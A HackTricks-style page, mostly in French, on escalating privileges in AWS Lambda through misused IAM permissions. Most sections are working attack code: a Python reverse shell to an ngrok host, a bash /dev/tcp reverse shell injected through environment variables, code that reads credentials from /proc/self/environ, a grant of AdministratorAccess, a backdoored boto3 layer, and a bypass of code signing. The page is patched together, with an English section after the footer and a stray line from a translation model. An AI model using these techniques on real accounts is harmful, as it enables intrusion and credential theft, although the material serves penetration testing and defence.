# AWS - Lambda Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## lambda

Plus d'infos sur lambda dans :

{{#ref}}
../../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Users with the **`iam:PassRole`, `lambda:CreateFunction`, and `lambda:InvokeFunction`** permissions can escalate their privileges.\
Ils peuvent **créer une nouvelle fonction Lambda et lui assigner un rôle IAM existant**, accordant à la fonction les permissions associées à ce rôle. L'utilisateur peut ensuite **écrire et téléverser du code dans cette fonction Lambda (par exemple une rev shell)**.\
Une fois la fonction configurée, l'utilisateur peut **déclencher son exécution** et les actions prévues en invoquant la fonction Lambda via l'AWS API. Cette approche permet effectivement à l'utilisateur d'exécuter des tâches indirectement via la fonction Lambda, en opérant avec le niveau d'accès accordé au rôle IAM qui lui est associé.\\

Un attaquant pourrait abuser de cela pour obtenir une **rev shell et voler le token**:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Vous pouvez aussi **abuser des permissions du rôle lambda** depuis la fonction lambda elle-même.\
Si le rôle lambda dispose de permissions suffisantes, vous pourriez l'utiliser pour vous accorder des droits d'admin :
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Il est également possible de leak les identifiants du rôle du lambda sans avoir besoin d'une connexion externe. Cela peut être utile pour les **Network isolated Lambdas** utilisées pour des tâches internes. Si des security groups inconnus filtrent vos reverse shells, ce morceau de code vous permettra de leak directement les identifiants en sortie de la lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Impact potentiel :** Escalade directe (privesc) vers le rôle de service lambda arbitraire spécifié.

> [!CAUTION]
> Notez que même si cela peut sembler intéressant **`lambda:InvokeAsync`** **ne permet pas** à lui seul d'**exécuter `aws lambda invoke-async`**, vous avez également besoin de `lambda:InvokeFunction`

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Comme dans le scénario précédent, vous pouvez **vous accorder la permission `lambda:InvokeFunction`** si vous disposez de la permission **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Impact potentiel :** Escalade de privilèges directe (privesc) vers le rôle de service lambda arbitraire spécifié.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Les utilisateurs disposant des permissions **`iam:PassRole`, `lambda:CreateFunction` et `lambda:CreateEventSourceMapping`** (et potentiellement `dynamodb:PutItem` et `dynamodb:CreateTable`) peuvent indirectement **escalate privileges** même sans `lambda:InvokeFunction`.\
Ils peuvent créer une **fonction Lambda avec du code malveillant et lui assigner un rôle IAM existant**.

Au lieu d'invoquer directement la Lambda, l'utilisateur met en place ou utilise une table DynamoDB existante, en la reliant à la Lambda via un event source mapping. Cette configuration garantit que la fonction Lambda est **déclenchée automatiquement lors de l'ajout d'un nouvel élément** dans la table, soit par l'action de l'utilisateur soit par un autre processus, invoquant ainsi indirectement la fonction Lambda et exécutant le code avec les permissions du rôle IAM passé.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Si DynamoDB est déjà actif dans l'environnement AWS, l'utilisateur n'a besoin que d'**établir l'event source mapping** pour la fonction Lambda. En revanche, si DynamoDB n'est pas utilisé, l'utilisateur doit **créer une nouvelle table** avec le streaming activé :
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Il est maintenant possible de **connect the Lambda function to the DynamoDB table** en **creating an event source mapping**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Avec la fonction Lambda liée au DynamoDB stream, l'attaquant peut **déclencher indirectement la fonction Lambda en activant le DynamoDB stream**. Cela peut être accompli en **insérant un item** dans la table DynamoDB :
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Impact potentiel :** privesc direct vers le rôle de service lambda spécifié.

### `lambda:AddPermission`

Un attacker disposant de cette permission peut **grant himself (or others) any permissions** (cela génère des resource based policies pour accorder l'accès à la resource):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**Impact potentiel :** Élévation de privilèges directe (privesc) vers le rôle de service lambda en accordant l'autorisation de modifier le code et de l'exécuter.

### `lambda:AddLayerVersionPermission`

Un attaquant disposant de cette autorisation peut **s'octroyer (ou accorder à d'autres) l'autorisation `lambda:GetLayerVersion`**. Il pourrait accéder au layer et rechercher des vulnérabilités ou des informations sensibles.
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Impact potentiel :** Accès potentiel à des informations sensibles.

### `lambda:UpdateFunctionCode`

Les utilisateurs disposant de la permission **`lambda:UpdateFunctionCode`** peuvent **modifier le code d'une Lambda function existante liée à un rôle IAM.**\
L'attaquant peut **modifier le code de la lambda pour exfiltrer les credentials IAM**.

Même si l'attaquant n'a pas forcément la capacité directe d'invoquer la fonction, si la Lambda function est préexistante et opérationnelle, il est probable qu'elle soit déclenchée par des workflows ou des événements existants, facilitant ainsi indirectement l'exécution du code modifié.
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Impact potentiel :** privesc direct vers le rôle de service lambda utilisé.

### `lambda:UpdateFunctionConfiguration`

#### RCE via env variables

Avec ces permissions, il est possible d'ajouter des environment variables qui provoqueront l'exécution de code arbitraire par la Lambda. Par exemple, en python il est possible d'abuser des environment variables `PYTHONWARNING` et `BROWSER` pour faire en sorte qu'un processus python exécute des commandes arbitraires :
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
Pour d'autres langages de scripting, il existe d'autres variables d'environnement que vous pouvez utiliser. Pour plus d'informations, consultez les sous-sections des langages de scripting dans:

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE via Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) permet d'inclure du **code** dans votre lamdba function mais **le stocker séparément**, de sorte que le code de la fonction peut rester petit et que **plusieurs fonctions peuvent partager du code**.

À l'intérieur de lambda vous pouvez vérifier les chemins depuis lesquels le python code est chargé avec une fonction comme la suivante:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Voici les emplacements :

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Par exemple, la bibliothèque boto3 est chargée depuis `/var/runtime/boto3` (4e position).

#### Exploitation

Il est possible d'abuser de la permission `lambda:UpdateFunctionConfiguration` pour **ajouter un nouveau layer** à une fonction lambda. Pour exécuter du code arbitraire, ce layer doit contenir une **bibliothèque que la lambda va importer.** Si vous pouvez lire le code de la lambda, vous pourrez le trouver facilement ; notez aussi qu'il est possible que la lambda **utilise déjà un layer** et que vous puissiez **télécharger** le layer et **ajouter votre code** dedans.

Par exemple, supposons que la lambda utilise la bibliothèque boto3, cela créera un layer local avec la dernière version de la bibliothèque :
```bash
pip3 install -t ./lambda_layer boto3
```
Vous pouvez ouvrir `./lambda_layer/boto3/__init__.py` et **add the backdoor in the global code** (une fonction pour exfiltrate credentials ou obtenir un reverse shell, par exemple).

Ensuite, zippez le répertoire `./lambda_layer` et **upload the new lambda layer** dans votre propre compte (ou dans celui de la victime, mais vous pourriez ne pas avoir les permissions pour cela).\
Notez que vous devez créer un dossier python et y placer les bibliothèques pour override /opt/python/boto3. De plus, le lambda layer doit être **compatible with the python version** utilisée par la lambda et, si vous l'uploadez dans votre compte, il doit se trouver dans la **same region:**
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
Maintenant, rendez la lambda layer téléversée **accessible par n'importe quel compte** :
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Et attachez le lambda layer à la victim lambda function:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
La prochaine étape serait soit de **invoquer la fonction** nous‑mêmes si nous le pouvons, soit d'attendre qu'i**l soit invoqué** par des moyens normaux — ce qui est la méthode la plus sûre.

Une **méthode plus discrète pour exploiter cette vulnérabilité** se trouve dans :

{{#ref}}
../../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Potential Impact:** Direct privesc to the lambda service role used.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Peut‑être qu'avec ces permissions vous êtes capable de créer une fonction et de l'exécuter en appelant l'URL... mais je pourrais trouver un moyen de le tester, alors dites‑moi si vous le faites !

### Lambda MitM

Certaines lambdas vont **recevoir des informations sensibles des utilisateurs dans les paramètres.** Si vous obtenez une RCE dans l'une d'elles, vous pouvez exfiltrer les informations que les autres utilisateurs lui envoient, consultez :

{{#ref}}
../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## References

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Bypass Lambda Code Signing

If a Lambda function enforces code signing, an attacker who can either remove the Code Signing Config (CSC) or downgrade it to Warn can deploy unsigned code to the function. This bypasses integrity protections without modifying the function's IAM role or triggers.

Permissions (one of):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Notes:
- For Path B, you don't need an AWS Signer profile if the CSC policy is set to `WARN` (unsigned artifacts allowed).

Steps (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Prepare a small payload:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
Option A) Supprimer CSC puis mettre à jour le code :
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Option B) Rétrograder à Warn et mettre à jour le code (si la suppression n'est pas autorisée):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Confirmed. I will translate the relevant English text to French, preserving exactly all code, hacking technique names, cloud/SaaS/platform names (aws, gcp, Workspace, etc.), links, paths, and all markdown/html tags (including {#...} tags). I will not modify links, refs, or tags and will not add any extra content.
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
Impact potentiel : Capacité à pousser et à exécuter du code arbitraire non signé dans une fonction qui était censée imposer des déploiements signés, pouvant potentiellement entraîner l'exécution de code avec les permissions du rôle de la fonction.

Nettoyage :
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

